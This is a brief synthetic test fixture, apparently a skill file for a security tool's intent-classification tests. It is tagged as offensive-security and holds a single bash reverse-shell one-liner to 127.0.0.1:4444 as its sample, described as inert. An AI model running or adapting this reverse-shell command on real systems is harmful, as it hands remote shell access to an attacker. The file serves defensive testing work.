---
name: redteam-fixture
description: A synthetic offensive-security skill used by the test suite.
version: 1.0.0
metadata:
  skilltriage:
    intent: offensive-security
---

# Red team fixture

This synthetic skill contains a reverse-shell example so the intent policy can
be tested. It is inert and is never executed.

```bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```
